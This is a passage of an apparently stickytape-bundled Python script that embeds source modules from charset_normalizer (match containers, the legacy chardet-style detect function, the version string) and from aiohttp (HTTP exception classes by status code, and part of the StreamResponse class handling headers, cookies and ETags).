List[str]:\n        """\n        The complete list of encoding that output the exact SAME str result and therefore could be the originating\n        encoding.\n        This list does include the encoding available in property \'encoding\'.\n        """\n        return [self._encoding] + [m.encoding for m in self._leaves]\n\n    def first(self) -> "CharsetMatch":\n        """\n        Kept for BC reasons. Will be removed in 3.0.\n        """\n        return self\n\n    def best(self) -> "CharsetMatch":\n        """\n        Kept for BC reasons. Will be removed in 3.0.\n        """\n        return self\n\n    def output(self, encoding: str = "utf_8") -> bytes:\n        """\n        Method to get re-encoded bytes payload using given target encoding. Default to UTF-8.\n        Any errors will be simply ignored by the encoder NOT replaced.\n        """\n        if self._output_encoding is None or self._output_encoding != encoding:\n            self._output_encoding = encoding\n            self._output_payload = str(self).encode(encoding, "replace")\n\n        return self._output_payload  # type: ignore\n\n    @property\n    def fingerprint(self) -> str:\n        """\n        Retrieve the unique SHA256 computed using the transformed (re-encoded) payload. Not the original one.\n        """\n        return sha256(self.output()).hexdigest()\n\n\nclass CharsetMatches:\n    """\n    Container with every CharsetMatch items ordered by default from most probable to the less one.\n    Act like a list(iterable) but does not implements all related methods.\n    """\n\n    def __init__(self, results: List[CharsetMatch] = None):\n        self._results = sorted(results) if results else []  # type: List[CharsetMatch]\n\n    def __iter__(self) -> Iterator[CharsetMatch]:\n        yield from self._results\n\n    def __getitem__(self, item: Union[int, str]) -> CharsetMatch:\n        """\n        Retrieve a single item either by its position or encoding name (alias may be used here).\n        Raise KeyError upon invalid index or encoding not present in results.\n        """\n        if isinstance(item, int):\n            return self._results[item]\n        if isinstance(item, str):\n            item = iana_name(item, False)\n            for result in self._results:\n                if item in result.could_be_from_charset:\n                    return result\n        raise KeyError\n\n    def __len__(self) -> int:\n        return len(self._results)\n\n    def __bool__(self) -> bool:\n        return len(self._results) > 0\n\n    def append(self, item: CharsetMatch) -> None:\n        """\n        Insert a single match. Will be inserted accordingly to preserve sort.\n        Can be inserted as a submatch.\n        """\n        if not isinstance(item, CharsetMatch):\n            raise ValueError(\n                "Cannot append instance \'{}\' to CharsetMatches".format(\n                    str(item.__class__)\n                )\n            )\n        # We should disable the submatch factoring when the input file is too heavy (conserve RAM usage)\n        if len(item.raw) <= TOO_BIG_SEQUENCE:\n            for match in self._results:\n                if match.fingerprint == item.fingerprint and match.chaos == item.chaos:\n                    match.add_submatch(item)\n                    return\n        self._results.append(item)\n        self._results = sorted(self._results)\n\n    def best(self) -> Optional["CharsetMatch"]:\n        """\n        Simply return the first match. Strict equivalent to matches[0].\n        """\n        if not self._results:\n            return None\n        return self._results[0]\n\n    def first(self) -> Optional["CharsetMatch"]:\n        """\n        Redundant method, call the method best(). Kept for BC reasons.\n        """\n        return self.best()\n\n\nCoherenceMatch = Tuple[str, float]\nCoherenceMatches = List[CoherenceMatch]\n\n\nclass CliDetectionResult:\n    def __init__(\n        self,\n        path: str,\n        encoding: Optional[str],\n        encoding_aliases: List[str],\n        alternative_encodings: List[str],\n        language: str,\n        alphabets: List[str],\n        has_sig_or_bom: bool,\n        chaos: float,\n        coherence: float,\n        unicode_path: Optional[str],\n        is_preferred: bool,\n    ):\n        self.path = path  # type: str\n        self.unicode_path = unicode_path  # type: Optional[str]\n        self.encoding = encoding  # type: Optional[str]\n        self.encoding_aliases = encoding_aliases  # type: List[str]\n        self.alternative_encodings = alternative_encodings  # type: List[str]\n        self.language = language  # type: str\n        self.alphabets = alphabets  # type: List[str]\n        self.has_sig_or_bom = has_sig_or_bom  # type: bool\n        self.chaos = chaos  # type: float\n        self.coherence = coherence  # type: float\n        self.is_preferred = is_preferred  # type: bool\n\n    @property\n    def __dict__(self) -> Dict[str, Any]:  # type: ignore\n        return {\n            "path": self.path,\n            "encoding": self.encoding,\n            "encoding_aliases": self.encoding_aliases,\n            "alternative_encodings": self.alternative_encodings,\n            "language": self.language,\n            "alphabets": self.alphabets,\n            "has_sig_or_bom": self.has_sig_or_bom,\n            "chaos": self.chaos,\n            "coherence": self.coherence,\n            "unicode_path": self.unicode_path,\n            "is_preferred": self.is_preferred,\n        }\n\n    def to_json(self) -> str:\n        return dumps(self.__dict__, ensure_ascii=True, indent=4)\n')
    __stickytape_write_module('charset_normalizer/legacy.py', b'import warnings\nfrom typing import Dict, Optional, Union\n\nfrom .api import from_bytes, from_fp, from_path, normalize\nfrom .constant import CHARDET_CORRESPONDENCE\nfrom .models import CharsetMatch, CharsetMatches\n\n\ndef detect(byte_str: bytes) -> Dict[str, Optional[Union[str, float]]]:\n    """\n    chardet legacy method\n    Detect the encoding of the given byte string. It should be mostly backward-compatible.\n    Encoding name will match Chardet own writing whenever possible. (Not on encoding name unsupported by it)\n    This function is deprecated and should be used to migrate your project easily, consult the documentation for\n    further information. Not planned for removal.\n\n    :param byte_str:     The byte sequence to examine.\n    """\n    if not isinstance(byte_str, (bytearray, bytes)):\n        raise TypeError(  # pragma: nocover\n            "Expected object of type bytes or bytearray, got: "\n            "{0}".format(type(byte_str))\n        )\n\n    if isinstance(byte_str, bytearray):\n        byte_str = bytes(byte_str)\n\n    r = from_bytes(byte_str).best()\n\n    encoding = r.encoding if r is not None else None\n    language = r.language if r is not None and r.language != "Unknown" else ""\n    confidence = 1.0 - r.chaos if r is not None else None\n\n    # Note: CharsetNormalizer does not return \'UTF-8-SIG\' as the sig get stripped in the detection/normalization process\n    # but chardet does return \'utf-8-sig\' and it is a valid codec name.\n    if r is not None and encoding == "utf_8" and r.bom:\n        encoding += "_sig"\n\n    return {\n        "encoding": encoding\n        if encoding not in CHARDET_CORRESPONDENCE\n        else CHARDET_CORRESPONDENCE[encoding],\n        "language": language,\n        "confidence": confidence,\n    }\n\n\nclass CharsetNormalizerMatch(CharsetMatch):\n    pass\n\n\nclass CharsetNormalizerMatches(CharsetMatches):\n    @staticmethod\n    def from_fp(*args, **kwargs):  # type: ignore\n        warnings.warn(  # pragma: nocover\n            "staticmethod from_fp, from_bytes, from_path and normalize are deprecated "\n            "and scheduled to be removed in 3.0",\n            DeprecationWarning,\n        )\n        return from_fp(*args, **kwargs)  # pragma: nocover\n\n    @staticmethod\n    def from_bytes(*args, **kwargs):  # type: ignore\n        warnings.warn(  # pragma: nocover\n            "staticmethod from_fp, from_bytes, from_path and normalize are deprecated "\n            "and scheduled to be removed in 3.0",\n            DeprecationWarning,\n        )\n        return from_bytes(*args, **kwargs)  # pragma: nocover\n\n    @staticmethod\n    def from_path(*args, **kwargs):  # type: ignore\n        warnings.warn(  # pragma: nocover\n            "staticmethod from_fp, from_bytes, from_path and normalize are deprecated "\n            "and scheduled to be removed in 3.0",\n            DeprecationWarning,\n        )\n        return from_path(*args, **kwargs)  # pragma: nocover\n\n    @staticmethod\n    def normalize(*args, **kwargs):  # type: ignore\n        warnings.warn(  # pragma: nocover\n            "staticmethod from_fp, from_bytes, from_path and normalize are deprecated "\n            "and scheduled to be removed in 3.0",\n            DeprecationWarning,\n        )\n        return normalize(*args, **kwargs)  # pragma: nocover\n\n\nclass CharsetDetector(CharsetNormalizerMatches):\n    pass\n\n\nclass CharsetDoctor(CharsetNormalizerMatches):\n    pass\n')
    __stickytape_write_module('charset_normalizer/version.py', b'"""\nExpose version\n"""\n\n__version__ = "2.0.12"\nVERSION = __version__.split(".")\n')
    __stickytape_write_module('aiohttp/web_exceptions.py', b'import warnings\r\nfrom typing import Any, Dict, Iterable, List, Optional, Set  # noqa\r\n\r\nfrom yarl import URL\r\n\r\nfrom .typedefs import LooseHeaders, StrOrURL\r\nfrom .web_response import Response\r\n\r\n__all__ = (\r\n    "HTTPException",\r\n    "HTTPError",\r\n    "HTTPRedirection",\r\n    "HTTPSuccessful",\r\n    "HTTPOk",\r\n    "HTTPCreated",\r\n    "HTTPAccepted",\r\n    "HTTPNonAuthoritativeInformation",\r\n    "HTTPNoContent",\r\n    "HTTPResetContent",\r\n    "HTTPPartialContent",\r\n    "HTTPMultipleChoices",\r\n    "HTTPMovedPermanently",\r\n    "HTTPFound",\r\n    "HTTPSeeOther",\r\n    "HTTPNotModified",\r\n    "HTTPUseProxy",\r\n    "HTTPTemporaryRedirect",\r\n    "HTTPPermanentRedirect",\r\n    "HTTPClientError",\r\n    "HTTPBadRequest",\r\n    "HTTPUnauthorized",\r\n    "HTTPPaymentRequired",\r\n    "HTTPForbidden",\r\n    "HTTPNotFound",\r\n    "HTTPMethodNotAllowed",\r\n    "HTTPNotAcceptable",\r\n    "HTTPProxyAuthenticationRequired",\r\n    "HTTPRequestTimeout",\r\n    "HTTPConflict",\r\n    "HTTPGone",\r\n    "HTTPLengthRequired",\r\n    "HTTPPreconditionFailed",\r\n    "HTTPRequestEntityTooLarge",\r\n    "HTTPRequestURITooLong",\r\n    "HTTPUnsupportedMediaType",\r\n    "HTTPRequestRangeNotSatisfiable",\r\n    "HTTPExpectationFailed",\r\n    "HTTPMisdirectedRequest",\r\n    "HTTPUnprocessableEntity",\r\n    "HTTPFailedDependency",\r\n    "HTTPUpgradeRequired",\r\n    "HTTPPreconditionRequired",\r\n    "HTTPTooManyRequests",\r\n    "HTTPRequestHeaderFieldsTooLarge",\r\n    "HTTPUnavailableForLegalReasons",\r\n    "HTTPServerError",\r\n    "HTTPInternalServerError",\r\n    "HTTPNotImplemented",\r\n    "HTTPBadGateway",\r\n    "HTTPServiceUnavailable",\r\n    "HTTPGatewayTimeout",\r\n    "HTTPVersionNotSupported",\r\n    "HTTPVariantAlsoNegotiates",\r\n    "HTTPInsufficientStorage",\r\n    "HTTPNotExtended",\r\n    "HTTPNetworkAuthenticationRequired",\r\n)\r\n\r\n\r\n############################################################\r\n# HTTP Exceptions\r\n############################################################\r\n\r\n\r\nclass HTTPException(Response, Exception):\r\n\r\n    # You should set in subclasses:\r\n    # status = 200\r\n\r\n    status_code = -1\r\n    empty_body = False\r\n\r\n    __http_exception__ = True\r\n\r\n    def __init__(\r\n        self,\r\n        *,\r\n        headers: Optional[LooseHeaders] = None,\r\n        reason: Optional[str] = None,\r\n        body: Any = None,\r\n        text: Optional[str] = None,\r\n        content_type: Optional[str] = None,\r\n    ) -> None:\r\n        if body is not None:\r\n            warnings.warn(\r\n                "body argument is deprecated for http web exceptions",\r\n                DeprecationWarning,\r\n            )\r\n        Response.__init__(\r\n            self,\r\n            status=self.status_code,\r\n            headers=headers,\r\n            reason=reason,\r\n            body=body,\r\n            text=text,\r\n            content_type=content_type,\r\n        )\r\n        Exception.__init__(self, self.reason)\r\n        if self.body is None and not self.empty_body:\r\n            self.text = f"{self.status}: {self.reason}"\r\n\r\n    def __bool__(self) -> bool:\r\n        return True\r\n\r\n\r\nclass HTTPError(HTTPException):\r\n    """Base class for exceptions with status codes in the 400s and 500s."""\r\n\r\n\r\nclass HTTPRedirection(HTTPException):\r\n    """Base class for exceptions with status codes in the 300s."""\r\n\r\n\r\nclass HTTPSuccessful(HTTPException):\r\n    """Base class for exceptions with status codes in the 200s."""\r\n\r\n\r\nclass HTTPOk(HTTPSuccessful):\r\n    status_code = 200\r\n\r\n\r\nclass HTTPCreated(HTTPSuccessful):\r\n    status_code = 201\r\n\r\n\r\nclass HTTPAccepted(HTTPSuccessful):\r\n    status_code = 202\r\n\r\n\r\nclass HTTPNonAuthoritativeInformation(HTTPSuccessful):\r\n    status_code = 203\r\n\r\n\r\nclass HTTPNoContent(HTTPSuccessful):\r\n    status_code = 204\r\n    empty_body = True\r\n\r\n\r\nclass HTTPResetContent(HTTPSuccessful):\r\n    status_code = 205\r\n    empty_body = True\r\n\r\n\r\nclass HTTPPartialContent(HTTPSuccessful):\r\n    status_code = 206\r\n\r\n\r\n############################################################\r\n# 3xx redirection\r\n############################################################\r\n\r\n\r\nclass _HTTPMove(HTTPRedirection):\r\n    def __init__(\r\n        self,\r\n        location: StrOrURL,\r\n        *,\r\n        headers: Optional[LooseHeaders] = None,\r\n        reason: Optional[str] = None,\r\n        body: Any = None,\r\n        text: Optional[str] = None,\r\n        content_type: Optional[str] = None,\r\n    ) -> None:\r\n        if not location:\r\n            raise ValueError("HTTP redirects need a location to redirect to.")\r\n        super().__init__(\r\n            headers=headers,\r\n            reason=reason,\r\n            body=body,\r\n            text=text,\r\n            content_type=content_type,\r\n        )\r\n        self.headers["Location"] = str(URL(location))\r\n        self.location = location\r\n\r\n\r\nclass HTTPMultipleChoices(_HTTPMove):\r\n    status_code = 300\r\n\r\n\r\nclass HTTPMovedPermanently(_HTTPMove):\r\n    status_code = 301\r\n\r\n\r\nclass HTTPFound(_HTTPMove):\r\n    status_code = 302\r\n\r\n\r\n# This one is safe after a POST (the redirected location will be\r\n# retrieved with GET):\r\nclass HTTPSeeOther(_HTTPMove):\r\n    status_code = 303\r\n\r\n\r\nclass HTTPNotModified(HTTPRedirection):\r\n    # FIXME: this should include a date or etag header\r\n    status_code = 304\r\n    empty_body = True\r\n\r\n\r\nclass HTTPUseProxy(_HTTPMove):\r\n    # Not a move, but looks a little like one\r\n    status_code = 305\r\n\r\n\r\nclass HTTPTemporaryRedirect(_HTTPMove):\r\n    status_code = 307\r\n\r\n\r\nclass HTTPPermanentRedirect(_HTTPMove):\r\n    status_code = 308\r\n\r\n\r\n############################################################\r\n# 4xx client error\r\n############################################################\r\n\r\n\r\nclass HTTPClientError(HTTPError):\r\n    pass\r\n\r\n\r\nclass HTTPBadRequest(HTTPClientError):\r\n    status_code = 400\r\n\r\n\r\nclass HTTPUnauthorized(HTTPClientError):\r\n    status_code = 401\r\n\r\n\r\nclass HTTPPaymentRequired(HTTPClientError):\r\n    status_code = 402\r\n\r\n\r\nclass HTTPForbidden(HTTPClientError):\r\n    status_code = 403\r\n\r\n\r\nclass HTTPNotFound(HTTPClientError):\r\n    status_code = 404\r\n\r\n\r\nclass HTTPMethodNotAllowed(HTTPClientError):\r\n    status_code = 405\r\n\r\n    def __init__(\r\n        self,\r\n        method: str,\r\n        allowed_methods: Iterable[str],\r\n        *,\r\n        headers: Optional[LooseHeaders] = None,\r\n        reason: Optional[str] = None,\r\n        body: Any = None,\r\n        text: Optional[str] = None,\r\n        content_type: Optional[str] = None,\r\n    ) -> None:\r\n        allow = ",".join(sorted(allowed_methods))\r\n        super().__init__(\r\n            headers=headers,\r\n            reason=reason,\r\n            body=body,\r\n            text=text,\r\n            content_type=content_type,\r\n        )\r\n        self.headers["Allow"] = allow\r\n        self.allowed_methods = set(allowed_methods)  # type: Set[str]\r\n        self.method = method.upper()\r\n\r\n\r\nclass HTTPNotAcceptable(HTTPClientError):\r\n    status_code = 406\r\n\r\n\r\nclass HTTPProxyAuthenticationRequired(HTTPClientError):\r\n    status_code = 407\r\n\r\n\r\nclass HTTPRequestTimeout(HTTPClientError):\r\n    status_code = 408\r\n\r\n\r\nclass HTTPConflict(HTTPClientError):\r\n    status_code = 409\r\n\r\n\r\nclass HTTPGone(HTTPClientError):\r\n    status_code = 410\r\n\r\n\r\nclass HTTPLengthRequired(HTTPClientError):\r\n    status_code = 411\r\n\r\n\r\nclass HTTPPreconditionFailed(HTTPClientError):\r\n    status_code = 412\r\n\r\n\r\nclass HTTPRequestEntityTooLarge(HTTPClientError):\r\n    status_code = 413\r\n\r\n    def __init__(self, max_size: float, actual_size: float, **kwargs: Any) -> None:\r\n        kwargs.setdefault(\r\n            "text",\r\n            "Maximum request body size {} exceeded, "\r\n            "actual body size {}".format(max_size, actual_size),\r\n        )\r\n        super().__init__(**kwargs)\r\n\r\n\r\nclass HTTPRequestURITooLong(HTTPClientError):\r\n    status_code = 414\r\n\r\n\r\nclass HTTPUnsupportedMediaType(HTTPClientError):\r\n    status_code = 415\r\n\r\n\r\nclass HTTPRequestRangeNotSatisfiable(HTTPClientError):\r\n    status_code = 416\r\n\r\n\r\nclass HTTPExpectationFailed(HTTPClientError):\r\n    status_code = 417\r\n\r\n\r\nclass HTTPMisdirectedRequest(HTTPClientError):\r\n    status_code = 421\r\n\r\n\r\nclass HTTPUnprocessableEntity(HTTPClientError):\r\n    status_code = 422\r\n\r\n\r\nclass HTTPFailedDependency(HTTPClientError):\r\n    status_code = 424\r\n\r\n\r\nclass HTTPUpgradeRequired(HTTPClientError):\r\n    status_code = 426\r\n\r\n\r\nclass HTTPPreconditionRequired(HTTPClientError):\r\n    status_code = 428\r\n\r\n\r\nclass HTTPTooManyRequests(HTTPClientError):\r\n    status_code = 429\r\n\r\n\r\nclass HTTPRequestHeaderFieldsTooLarge(HTTPClientError):\r\n    status_code = 431\r\n\r\n\r\nclass HTTPUnavailableForLegalReasons(HTTPClientError):\r\n    status_code = 451\r\n\r\n    def __init__(\r\n        self,\r\n        link: str,\r\n        *,\r\n        headers: Optional[LooseHeaders] = None,\r\n        reason: Optional[str] = None,\r\n        body: Any = None,\r\n        text: Optional[str] = None,\r\n        content_type: Optional[str] = None,\r\n    ) -> None:\r\n        super().__init__(\r\n            headers=headers,\r\n            reason=reason,\r\n            body=body,\r\n            text=text,\r\n            content_type=content_type,\r\n        )\r\n        self.headers["Link"] = \'<%s>; rel="blocked-by"\' % link\r\n        self.link = link\r\n\r\n\r\n############################################################\r\n# 5xx Server Error\r\n############################################################\r\n#  Response status codes beginning with the digit "5" indicate cases in\r\n#  which the server is aware that it has erred or is incapable of\r\n#  performing the request. Except when responding to a HEAD request, the\r\n#  server SHOULD include an entity containing an explanation of the error\r\n#  situation, and whether it is a temporary or permanent condition. User\r\n#  agents SHOULD display any included entity to the user. These response\r\n#  codes are applicable to any request method.\r\n\r\n\r\nclass HTTPServerError(HTTPError):\r\n    pass\r\n\r\n\r\nclass HTTPInternalServerError(HTTPServerError):\r\n    status_code = 500\r\n\r\n\r\nclass HTTPNotImplemented(HTTPServerError):\r\n    status_code = 501\r\n\r\n\r\nclass HTTPBadGateway(HTTPServerError):\r\n    status_code = 502\r\n\r\n\r\nclass HTTPServiceUnavailable(HTTPServerError):\r\n    status_code = 503\r\n\r\n\r\nclass HTTPGatewayTimeout(HTTPServerError):\r\n    status_code = 504\r\n\r\n\r\nclass HTTPVersionNotSupported(HTTPServerError):\r\n    status_code = 505\r\n\r\n\r\nclass HTTPVariantAlsoNegotiates(HTTPServerError):\r\n    status_code = 506\r\n\r\n\r\nclass HTTPInsufficientStorage(HTTPServerError):\r\n    status_code = 507\r\n\r\n\r\nclass HTTPNotExtended(HTTPServerError):\r\n    status_code = 510\r\n\r\n\r\nclass HTTPNetworkAuthenticationRequired(HTTPServerError):\r\n    status_code = 511\r\n')
    __stickytape_write_module('aiohttp/web_response.py', b'import asyncio\r\nimport collections.abc\r\nimport datetime\r\nimport enum\r\nimport json\r\nimport math\r\nimport time\r\nimport warnings\r\nimport zlib\r\nfrom concurrent.futures import Executor\r\nfrom http.cookies import Morsel, SimpleCookie\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Dict,\r\n    Iterator,\r\n    Mapping,\r\n    MutableMapping,\r\n    Optional,\r\n    Tuple,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nfrom multidict import CIMultiDict, istr\r\n\r\nfrom . import hdrs, payload\r\nfrom .abc import AbstractStreamWriter\r\nfrom .helpers import (\r\n    ETAG_ANY,\r\n    PY_38,\r\n    QUOTED_ETAG_RE,\r\n    ETag,\r\n    HeadersMixin,\r\n    parse_http_date,\r\n    rfc822_formatted_time,\r\n    sentinel,\r\n    validate_etag_value,\r\n)\r\nfrom .http import RESPONSES, SERVER_SOFTWARE, HttpVersion10, HttpVersion11\r\nfrom .payload import Payload\r\nfrom .typedefs import JSONEncoder, LooseHeaders\r\n\r\n__all__ = ("ContentCoding", "StreamResponse", "Response", "json_response")\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .web_request import BaseRequest\r\n\r\n    BaseClass = MutableMapping[str, Any]\r\nelse:\r\n    BaseClass = collections.abc.MutableMapping\r\n\r\n\r\nif not PY_38:\r\n    # allow samesite to be used in python < 3.8\r\n    # already permitted in python 3.8, see https://bugs.python.org/issue29613\r\n    Morsel._reserved["samesite"] = "SameSite"  # type: ignore[attr-defined]\r\n\r\n\r\nclass ContentCoding(enum.Enum):\r\n    # The content codings that we have support for.\r\n    #\r\n    # Additional registered codings are listed at:\r\n    # https://www.iana.org/assignments/http-parameters/http-parameters.xhtml#content-coding\r\n    deflate = "deflate"\r\n    gzip = "gzip"\r\n    identity = "identity"\r\n\r\n\r\n############################################################\r\n# HTTP Response classes\r\n############################################################\r\n\r\n\r\nclass StreamResponse(BaseClass, HeadersMixin):\r\n\r\n    _length_check = True\r\n\r\n    def __init__(\r\n        self,\r\n        *,\r\n        status: int = 200,\r\n        reason: Optional[str] = None,\r\n        headers: Optional[LooseHeaders] = None,\r\n    ) -> None:\r\n        self._body = None\r\n        self._keep_alive = None  # type: Optional[bool]\r\n        self._chunked = False\r\n        self._compression = False\r\n        self._compression_force = None  # type: Optional[ContentCoding]\r\n        self._cookies = SimpleCookie()  # type: SimpleCookie[str]\r\n\r\n        self._req = None  # type: Optional[BaseRequest]\r\n        self._payload_writer = None  # type: Optional[AbstractStreamWriter]\r\n        self._eof_sent = False\r\n        self._body_length = 0\r\n        self._state = {}  # type: Dict[str, Any]\r\n\r\n        if headers is not None:\r\n            self._headers = CIMultiDict(headers)  # type: CIMultiDict[str]\r\n        else:\r\n            self._headers = CIMultiDict()\r\n\r\n        self.set_status(status, reason)\r\n\r\n    @property\r\n    def prepared(self) -> bool:\r\n        return self._payload_writer is not None\r\n\r\n    @property\r\n    def task(self) -> "Optional[asyncio.Task[None]]":\r\n        if self._req:\r\n            return self._req.task\r\n        else:\r\n            return None\r\n\r\n    @property\r\n    def status(self) -> int:\r\n        return self._status\r\n\r\n    @property\r\n    def chunked(self) -> bool:\r\n        return self._chunked\r\n\r\n    @property\r\n    def compression(self) -> bool:\r\n        return self._compression\r\n\r\n    @property\r\n    def reason(self) -> str:\r\n        return self._reason\r\n\r\n    def set_status(\r\n        self,\r\n        status: int,\r\n        reason: Optional[str] = None,\r\n        _RESPONSES: Mapping[int, Tuple[str, str]] = RESPONSES,\r\n    ) -> None:\r\n        assert not self.prepared, (\r\n            "Cannot change the response status code after " "the headers have been sent"\r\n        )\r\n        self._status = int(status)\r\n        if reason is None:\r\n            try:\r\n                reason = _RESPONSES[self._status][0]\r\n            except Exception:\r\n                reason = ""\r\n        self._reason = reason\r\n\r\n    @property\r\n    def keep_alive(self) -> Optional[bool]:\r\n        return self._keep_alive\r\n\r\n    def force_close(self) -> None:\r\n        self._keep_alive = False\r\n\r\n    @property\r\n    def body_length(self) -> int:\r\n        return self._body_length\r\n\r\n    @property\r\n    def output_length(self) -> int:\r\n        warnings.warn("output_length is deprecated", DeprecationWarning)\r\n        assert self._payload_writer\r\n        return self._payload_writer.buffer_size\r\n\r\n    def enable_chunked_encoding(self, chunk_size: Optional[int] = None) -> None:\r\n        """Enables automatic chunked transfer encoding."""\r\n        self._chunked = True\r\n\r\n        if hdrs.CONTENT_LENGTH in self._headers:\r\n            raise RuntimeError(\r\n                "You can\'t enable chunked encoding when " "a content length is set"\r\n            )\r\n        if chunk_size is not None:\r\n            warnings.warn("Chunk size is deprecated #1615", DeprecationWarning)\r\n\r\n    def enable_compression(\r\n        self, force: Optional[Union[bool, ContentCoding]] = None\r\n    ) -> None:\r\n        """Enables response compression encoding."""\r\n        # Backwards compatibility for when force was a bool <0.17.\r\n        if type(force) == bool:\r\n            force = ContentCoding.deflate if force else ContentCoding.identity\r\n            warnings.warn(\r\n                "Using boolean for force is deprecated #3318", DeprecationWarning\r\n            )\r\n        elif force is not None:\r\n            assert isinstance(force, ContentCoding), (\r\n                "force should one of " "None, bool or " "ContentEncoding"\r\n            )\r\n\r\n        self._compression = True\r\n        self._compression_force = force\r\n\r\n    @property\r\n    def headers(self) -> "CIMultiDict[str]":\r\n        return self._headers\r\n\r\n    @property\r\n    def cookies(self) -> "SimpleCookie[str]":\r\n        return self._cookies\r\n\r\n    def set_cookie(\r\n        self,\r\n        name: str,\r\n        value: str,\r\n        *,\r\n        expires: Optional[str] = None,\r\n        domain: Optional[str] = None,\r\n        max_age: Optional[Union[int, str]] = None,\r\n        path: str = "/",\r\n        secure: Optional[bool] = None,\r\n        httponly: Optional[bool] = None,\r\n        version: Optional[str] = None,\r\n        samesite: Optional[str] = None,\r\n    ) -> None:\r\n        """Set or update response cookie.\r\n\r\n        Sets new cookie or updates existent with new value.\r\n        Also updates only those params which are not None.\r\n        """\r\n        old = self._cookies.get(name)\r\n        if old is not None and old.coded_value == "":\r\n            # deleted cookie\r\n            self._cookies.pop(name, None)\r\n\r\n        self._cookies[name] = value\r\n        c = self._cookies[name]\r\n\r\n        if expires is not None:\r\n            c["expires"] = expires\r\n        elif c.get("expires") == "Thu, 01 Jan 1970 00:00:00 GMT":\r\n            del c["expires"]\r\n\r\n        if domain is not None:\r\n            c["domain"] = domain\r\n\r\n        if max_age is not None:\r\n            c["max-age"] = str(max_age)\r\n        elif "max-age" in c:\r\n            del c["max-age"]\r\n\r\n        c["path"] = path\r\n\r\n        if secure is not None:\r\n            c["secure"] = secure\r\n        if httponly is not None:\r\n            c["httponly"] = httponly\r\n        if version is not None:\r\n            c["version"] = version\r\n        if samesite is not None:\r\n            c["samesite"] = samesite\r\n\r\n    def del_cookie(\r\n        self, name: str, *, domain: Optional[str] = None, path: str = "/"\r\n    ) -> None:\r\n        """Delete cookie.\r\n\r\n        Creates new empty expired cookie.\r\n        """\r\n        # TODO: do we need domain/path here?\r\n        self._cookies.pop(name, None)\r\n        self.set_cookie(\r\n            name,\r\n            "",\r\n            max_age=0,\r\n            expires="Thu, 01 Jan 1970 00:00:00 GMT",\r\n            domain=domain,\r\n            path=path,\r\n        )\r\n\r\n    @property\r\n    def content_length(self) -> Optional[int]:\r\n        # Just a placeholder for adding setter\r\n        return super().content_length\r\n\r\n    @content_length.setter\r\n    def content_length(self, value: Optional[int]) -> None:\r\n        if value is not None:\r\n            value = int(value)\r\n            if self._chunked:\r\n                raise RuntimeError(\r\n                    "You can\'t set content length when " "chunked encoding is enable"\r\n                )\r\n            self._headers[hdrs.CONTENT_LENGTH] = str(value)\r\n        else:\r\n            self._headers.pop(hdrs.CONTENT_LENGTH, None)\r\n\r\n    @property\r\n    def content_type(self) -> str:\r\n        # Just a placeholder for adding setter\r\n        return super().content_type\r\n\r\n    @content_type.setter\r\n    def content_type(self, value: str) -> None:\r\n        self.content_type  # read header values if needed\r\n        self._content_type = str(value)\r\n        self._generate_content_type_header()\r\n\r\n    @property\r\n    def charset(self) -> Optional[str]:\r\n        # Just a placeholder for adding setter\r\n        return super().charset\r\n\r\n    @charset.setter\r\n    def charset(self, value: Optional[str]) -> None:\r\n        ctype = self.content_type  # read header values if needed\r\n        if ctype == "application/octet-stream":\r\n            raise RuntimeError(\r\n                "Setting charset for application/octet-stream "\r\n                "doesn\'t make sense, setup content_type first"\r\n            )\r\n        assert self._content_dict is not None\r\n        if value is None:\r\n            self._content_dict.pop("charset", None)\r\n        else:\r\n            self._content_dict["charset"] = str(value).lower()\r\n        self._generate_content_type_header()\r\n\r\n    @property\r\n    def last_modified(self) -> Optional[datetime.datetime]:\r\n        """The value of Last-Modified HTTP header, or None.\r\n\r\n        This header is represented as a `datetime` object.\r\n        """\r\n        return parse_http_date(self._headers.get(hdrs.LAST_MODIFIED))\r\n\r\n    @last_modified.setter\r\n    def last_modified(\r\n        self, value: Optional[Union[int, float, datetime.datetime, str]]\r\n    ) -> None:\r\n        if value is None:\r\n            self._headers.pop(hdrs.LAST_MODIFIED, None)\r\n        elif isinstance(value, (int, float)):\r\n            self._headers[hdrs.LAST_MODIFIED] = time.strftime(\r\n                "%a, %d %b %Y %H:%M:%S GMT", time.gmtime(math.ceil(value))\r\n            )\r\n        elif isinstance(value, datetime.datetime):\r\n            self._headers[hdrs.LAST_MODIFIED] = time.strftime(\r\n                "%a, %d %b %Y %H:%M:%S GMT", value.utctimetuple()\r\n            )\r\n        elif isinstance(value, str):\r\n            self._headers[hdrs.LAST_MODIFIED] = value\r\n\r\n    @property\r\n    def etag(self) -> Optional[ETag]:\r\n        quoted_value = self._headers.get(hdrs.ETAG)\r\n        if not quoted_value:\r\n            return None\r\n        elif quoted_value == ETAG_ANY:\r\n            return ETag(value=ETAG_ANY)\r\n        match = QUOTED_ETAG_RE.fullmatch(quoted_value)\r\n        if not match:\r\n            return None\r\n        is_weak, value = match.group(1, 2)\r\n        return ETag(\r\n            is_weak=bool(is_weak),\r\n            value=value,\r\n        )\r\n\r\n    @etag.setter\r\n    def etag(self, value: Optional[Union[ETag, str]]) -> None:\r\n        if value is None:\r\n            self._headers.pop(hdrs.ETAG, None)\r\n        elif (isinstance(value, str) and value == ETAG_ANY) or (\r\n            isinstance(value, ETag) and value.value == ETAG_ANY\r\n        ):\r\n            self._headers[hdrs.ETAG] = ETAG_ANY\r\n        elif isinstance(value, str):\r\n            validate_etag_value(value)\r\n            self._headers[hdrs.ETAG] = f\'"{value}"\'\r\n        elif isinstance(value, ETag) and isinstance(value.value, str):\r\n            validate_etag_value(value.value)\r\n            hdr_value = f\'W/"{value.value}"\' if value.is_weak else f\'"{value.value}"\'\r\n            self._headers[hdrs.ETAG] = hdr_value\r\n        else:\r\n            raise ValueError(\r\n                f"Unsupported etag type: {type(value)}. "\r\n                f"etag must be str, ETag or None"\r\n            )\r\n\r\n    def _generate_content_type_header(\r\n        self, CONTENT_TYPE: istr = hdrs.CONTENT_TYPE\r\n    ) -> None:\r\n        assert self._content_dict is not None\r\n        assert self._content_type is not None\r\n        params = "; ".join(f"{k}={v}" for k, v in self._content_dict.items())\r\n        if params:\r\n            ctype = self._content_type + "; " + params\r\n        else:\r\n            ctype = self._content_type\r\n        self._headers[CONTENT_TYPE] = ctype\r\n\r\n    async def _do_start_compression(self, coding: ContentCoding) -> None:\r\n        if coding != ContentCoding.identity:\r\n            assert self._payload_writer is not 